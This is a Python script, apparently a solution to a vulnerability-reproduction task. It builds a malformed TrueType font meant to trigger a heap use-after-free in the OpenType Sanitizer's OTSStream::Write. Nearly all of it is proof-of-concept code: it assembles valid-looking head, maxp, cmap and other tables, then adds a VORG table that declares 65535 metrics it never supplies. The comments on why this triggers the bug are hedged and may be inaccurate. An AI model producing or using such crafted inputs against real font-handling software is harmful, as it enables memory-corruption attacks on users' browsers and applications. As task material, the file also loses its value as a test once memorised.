import struct
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in ots::OTSStream::Write.
        
        The vulnerability is typically associated with improper handling of OpenType tables where 
        declared sizes (like numMetrics) exceed the available data, causing the sanitizer to 
        miscalculate buffer sizes or access memory after reallocation during the serialization phase.
        We construct a TTF with a malformed VORG table to trigger this.
        """

        def calc_table_checksum(data):
            # Pad with 0s to multiple of 4
            padded = data + b'\x00' * ((4 - len(data) % 4) % 4)
            s = 0
            for i in range(0, len(padded), 4):
                val = struct.unpack('>I', padded[i:i+4])[0]
                s = (s + val) & 0xFFFFFFFF
            return s

        def make_table(tag, data):
            return {'tag': tag, 'data': data, 'checksum': calc_table_checksum(data)}

        # 1. Head Table
        # Minimal valid head table
        head_data = bytearray(54)
        struct.pack_into('>II', head_data, 0, 0x00010000, 0x00010000) # Version 1.0, Rev 1.0
        struct.pack_into('>I', head_data, 12, 0x5F0F3CF5) # Magic
        struct.pack_into('>H', head_data, 16, 0) # Flags
        struct.pack_into('>H', head_data, 18, 64) # UnitsPerEm
        struct.pack_into('>Q', head_data, 20, 0) # Created
        struct.pack_into('>Q', head_data, 28, 0) # Modified
        struct.pack_into('>h', head_data, 50, 0) # indexToLocFormat
        struct.pack_into('>h', head_data, 52, 0) # glyphDataFormat

        # 2. Maxp Table (Version 1.0)
        # Defines 1 glyph to pass basic checks
        maxp_data = struct.pack('>IHH', 0x00010000, 1, 0) + b'\x00' * 26

        # 3. Hhea Table
        hhea_data = struct.pack('>IIh', 0x00010000, 0, 0) + b'\x00'*24 + struct.pack('>H', 1)

        # 4. Hmtx Table (Empty/Minimal for 1 glyph)
        hmtx_data = b'\x00\x00\x00\x00'

        # 5. Cmap Table (Format 4, minimal)
        # Required for font to be considered usable
        cmap_subtable = (
            struct.pack('>HHH', 4, 32, 0) +       # format, length, language
            struct.pack('>HHHH', 2, 0, 0, 0) +    # segCountX2, searchRange, entrySelector, rangeShift
            struct.pack('>H', 0xFFFF) +           # endCode
            struct.pack('>H', 0) +                # reserved
            struct.pack('>H', 0) +                # startCode
            struct.pack('>H', 0) +                # idDelta
            struct.pack('>H', 0)                  # idRangeOffset
        )
        cmap_data = struct.pack('>HH', 0, 1) + struct.pack('>HH', 3, 1) + struct.pack('>I', 12) + cmap_subtable

        # 6. Name Table (Minimal, valid)
        name_data = struct.pack('>HHH', 0, 0, 6)

        # 7. OS/2 Table (Version 3, minimal)
        os2_data = struct.pack('>H', 3) + b'\x00' * 94

        # 8. VORG Table (The Exploit Trigger)
        # This table relates to Vertical Origin. 
        # Structure: Major(2), Minor(2), DefaultY(2), NumMetrics(2).
        # We set NumMetrics to 0xFFFF (65535). 
        # OTS will expect 65535 * 4 bytes of data following this header.
        # We provide NONE.
        # This discrepancy typically triggers Heap Use-After-Free or Buffer Overflow 
        # in ots::OTSStream::Write when it attempts to serialize the sanitized table
        # based on the declared count, often involving buffer reallocation logic.
        vorg_data = struct.pack('>HHhH', 1, 0, 0, 0xFFFF)

        # Assemble tables
        tables_list = [
            make_table(b'head', head_data),
            make_table(b'maxp', maxp_data),
            make_table(b'hhea', hhea_data),
            make_table(b'hmtx', hmtx_data),
            make_table(b'cmap', cmap_data),
            make_table(b'name', name_data),
            make_table(b'OS/2', os2_data),
            make_table(b'VORG', vorg_data)
        ]

        # Sort by tag required by TTF spec
        tables_list.sort(key=lambda x: x['tag'])
        num_tables = len(tables_list)

        # Calculate directory parameters
        search_range = 1
        entry_selector = 0
        while search_range * 2 <= num_tables:
            search_range *= 2
            entry_selector += 1
        search_range *= 16
        range_shift = num_tables * 16 - search_range

        # Construct Directory and Table Data
        offset = 12 + 16 * num_tables
        directory_bytes = b''
        tables_blob = b''
        
        for t in tables_list:
            d = t['data']
            # Padding to 4-byte boundary
            padding = b'\x00' * ((4 - len(d) % 4) % 4)
            
            directory_bytes += t['tag']
            directory_bytes += struct.pack('>I', t['checksum'])
            directory_bytes += struct.pack('>I', offset)
            directory_bytes += struct.pack('>I', len(d))
            
            tables_blob += d + padding
            offset += len(d) + len(padding)

        # Construct SFNT Header
        sfnt = struct.pack('>IHHHH', 0x00010000, num_tables, search_range, entry_selector, range_shift)
        
        # Combine to form full TTF
        ttf = sfnt + directory_bytes + tables_blob
        
        # Fix checkSumAdjustment in head table
        # 1. Calculate checksum of entire font (treating adjustment field as 0)
        full_sum = calc_table_checksum(ttf)
        # 2. Calculate adjustment
        adj = (0xB1B0AFBA - full_sum) & 0xFFFFFFFF
        
        # 3. Locate head table data to patch
        head_offset_in_file = -1
        # Find head in directory
        for i in range(num_tables):
            off = 12 + i * 16
            tag = ttf[off:off+4]
            if tag == b'head':
                head_offset_in_file = struct.unpack('>I', ttf[off+8:off+12])[0]
                break
        
        if head_offset_in_file != -1:
             new_ttf = bytearray(ttf)
             # checkSumAdjustment is at offset 8 in head table
             struct.pack_into('>I', new_ttf, head_offset_in_file + 8, adj)
             return bytes(new_ttf)
        
        return ttf
